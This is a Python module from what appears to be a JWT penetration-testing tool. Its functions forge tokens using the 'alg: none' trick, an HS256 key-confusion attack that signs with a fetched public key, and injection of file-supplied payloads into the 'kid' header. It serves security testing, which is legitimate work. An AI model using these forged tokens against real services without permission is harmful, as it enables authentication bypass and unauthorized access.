import json

import pem
import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey, RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import load_pem_public_key

import utils
import TestJWT
from TestJWT import TestJWT


def attack_none(jwt: TestJWT):
    payloads = {}

    jwt.set_algorithm('none')
    payloads['attack_alg_none'] = utils.force_unicode(jwt.build_token())
    jwt.set_algorithm('None')
    payloads['attack_alg_None'] = utils.force_unicode(jwt.build_token())
    jwt.set_algorithm('NONE')
    payloads['attack_alg_NONE'] = utils.force_unicode(jwt.build_token())

    return payloads


def attack_signature_deception(jwt: TestJWT, url):
    payloads = {}
    secret = read_file(url, strip_newline=False, join_lines=False)
    jwt.set_algorithm("HS256")
    payloads['attack_signature_deception'] = jwt.build_token(secret)
    return payloads


def attack_payload(serial_jwt: str, payload_file: str):
    lines = read_file(payload_file, join_lines=False)
    header, payload, signature = TestJWT.split_jwt(serial_jwt)
    header = json.loads(utils.base64url_decode(header))
    inj_headers = [inject_in_json(header, line) for line in lines]
    payloads = {}
    for index, inj_header in zip(range(1, 1+len(inj_headers)), inj_headers):
        payloads["attack_payload_{}".format(index)] = ".".join(
            [utils.force_unicode(inj_header), payload, signature])
    return payloads


def inject_in_json(header: dict, payload: str):
    key = header['kid']
    if key is not None:
        header['kid'] = payload
    return TestJWT.build_section(header)


def read_pem_file(file, debug=True):
    key = pem.parse_file(file)
    if debug:
        print('Read PEM:\n{}\n'.format(str(key)))
    return key[0].as_bytes()


def read_file(file: str, strip_newline=True, join_lines=False):
    """
    Reads a file
    :param file: Full path of the file to read. HTTP is used to retrieve file if parameter starts with https://
    :param strip_newline: If True, carriage returns (\n) are removed
    :param join_lines: If True, lines read are concatenated into a single line.
    :return: List of lines read
    """
    if file.lower().startswith("https://"):
        # TODO consider if keepends overlaps with strip_newline or join_lines
        key_list = requests.get(file, verify=True).text.splitlines()
    else:
        with open(file, "r") as f:
            key_list = f.readlines()
    if strip_newline:
        key_list = [x.replace('\n', '').strip() for x in key_list]
    if join_lines:
        return "".join(key_list)
    return key_list


def rsa_pubkey_to_jwk(pem_file, key_id=None):
    """
    Only RS256 supported so far
    :param pem_file: path of PEM file containing RSA public key
    :param key_id: (optional) keyid to be included in the JWK
    :return:
    """

    rsa_pk: RSAPublicKey = load_pem_public_key(read_pem_file(pem_file), default_backend())
    e = rsa_pk.public_numbers().e
    n = rsa_pk.public_numbers().n
    jwk = {}
    if key_id is not None:
        jwk['kid'] = key_id
    jwk['kty'] = "RSA"
    jwk["alg"] = "RS256"
    jwk['n'] = utils.base64url_encode(n.to_bytes((n.bit_length() + 7) // 8, byteorder='big'))
    jwk['e'] = utils.base64url_encode(e.to_bytes((e.bit_length() + 7) // 8, byteorder='big'))
    return jwk


def rsa_jwk_to_pubkey(jwk):
    """
    Only RS256 supported so far
    :return:
    """

    e = int.from_bytes(utils.base64url_decode(jwk['e']), byteorder='big')
    n = int.from_bytes(utils.base64url_decode(jwk['n']), byteorder='big')
    pub_num = RSAPublicNumbers(e, n)
    return pub_num.public_key(backend=default_backend())